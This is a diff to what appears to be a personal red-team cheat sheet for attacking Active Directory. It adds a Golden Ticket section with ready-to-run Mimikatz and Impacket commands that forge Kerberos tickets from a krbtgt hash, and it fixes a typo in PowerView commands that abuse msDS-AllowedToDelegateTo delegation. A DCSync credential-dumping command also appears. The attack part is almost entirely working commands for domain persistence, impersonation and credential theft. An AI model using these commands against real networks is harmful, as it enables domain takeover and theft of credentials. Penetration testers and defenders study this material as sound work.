@@ -47,7 +47,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Credential Harvesing](#credential-harvesting)
 		* [DCSync](#dcsync)
 * **[Persistence](#persistence)**
-	* Golden Ticket
+	* [Golden Ticket](#golden-ticket)
 	* Skeleton Keys
 	* Shortcuts
 	* [msDS-AllowedToDelegateTo](#msds-allowedtodelegateto)
@@ -453,6 +453,16 @@ lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc0
 
 ## Persistence
 
+### Golden Ticket
+A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine
+```
+# Mimikatz
+kerberos::golden /domain:legitcorp.local /sid:S-1-5-21-1935943001-39345449-285568504 /rc4:7e8612a348a729bcb2f597a9cbc27c12 /user:trex /ptt
+
+# Impacket
+ticketer.py -domain legitcorp.local -nthash 7e8612a348a729bcb2f597a9cbc27c12 -dc-ip 192.179.86.170 -domain-sid S-1-5-21-1935943001-39345449-285568504 trex
+```
+
 ### msDS-AllowedToDelegateTo
 Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls the services to which a user accounts has access to. This means, with enough privileges, it is possible to access any service from a target user.
 
@@ -462,7 +472,7 @@ Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls
 Set-ADUser -Identity lowpriv -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.legitcorp.local')} -Verbose
 
 # PowerView
-Set-DOmainObject -Identity lowpriv -Set @{"msds-allowedtodelegateto"="cifs/dc01.legitcorp.local"}
+Set-DomainObject -Identity lowpriv -Set @{"msds-allowedtodelegateto"="cifs/dc01.legitcorp.local"}
 Set-DomainObject -SamAccountName lowpriv -Xor @{"useraccountcontrol"="16777216"}
 
 # Linux
